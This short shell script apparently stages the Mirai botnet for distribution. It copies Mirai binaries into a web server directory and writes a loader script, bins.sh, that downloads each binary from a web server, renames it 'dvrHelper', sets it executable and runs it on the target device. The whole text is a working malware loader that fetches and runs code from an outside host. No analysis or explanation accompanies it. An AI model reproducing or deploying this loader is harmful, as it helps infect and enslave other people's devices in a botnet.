mkdir /var/www/html/bins
cp /home/debug/mirai* /var/www/html/bins

echo "#!/bin/sh
 
WEBSERVER=\"192.168.10.10:80\"
 
 
BINARIES=\"mirai.i586 mirai.x86 mirai.dbg\"
 
for Binary in \$BINARIES; do
    wget http://\$WEBSERVER/bins/\$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done" > /var/www/html/bins/bins.sh